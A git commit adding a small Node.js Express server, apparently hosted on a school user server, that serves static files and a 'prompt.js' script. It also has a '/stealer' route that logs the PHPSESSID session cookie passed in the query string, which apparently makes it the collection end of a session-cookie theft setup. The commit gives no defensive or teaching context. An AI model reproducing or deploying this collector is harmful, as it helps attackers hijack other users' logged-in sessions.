58eebc47fc21e581e9be73f611b352f9404bf4da
Justin <2019jgou@tjhsst.edu>
2018-03-10 17:07:43 -0500

    test

---
+++ server.js
@@ -0,0 +1,53 @@
+#!/usr/bin/nodejs
+
+// // -------------- load packages -------------- //
+
+// INITIALIZATION STUFF
+var express = require('express');
+var app = express();
+var path = require('path');
+var hbs = require('hbs');
+var request = require('request');
+
+
+// // -------------- express initialization -------------- //
+
+// PORT SETUP - NUMBER SPECIFIC TO THIS SYSTEM
+app.set('port', process.env.PORT || 8080 );
+app.set('view engine','hbs');
+
+app.use('/js', express.static(path.join(__dirname, 'javascript')));
+app.use('/css', express.static(path.join(__dirname, 'css')));
+app.use('/img', express.static(path.join(__dirname, 'img')));
+// -------------- variable definition -------------- //
+// This counter is stored in RAM, and will be reset every time you
+// restart the server.
+
+// // -------------- express 'get' handlers -------------- //
+// // These 'getters' are what fetch your pages
+
+app.get('/', function(req, res){
+    res.sendFile(__dirname + '/index.html');
+});
+
+app.get('/:page', function(req, res){
+    var paramsRequest = req.params.page;
+    
+    // specific logic if the user requested https://user.tjhsst.edu/pckosek/flipcoin,
+    // otherwise, redirect to the root level page
+    if (paramsRequest=='stealer') {
+        console.log(req.query.PHPSESSID);
+    } else if(paramsRequest=='prompt.js'){
+           res.sendFile(__dirname+"/prompt.js");
+    }else{
+        res.redirect('https://user.tjhsst.edu/2019jgou/');
+    }
+});
+
+// -------------- listener -------------- //
+// // The listener is what keeps node 'alive.' 
+
+
+var listener = app.listen(app.get('port'), function() {
+  console.log( 'Express server started on port: '+listener.address().port );
+});
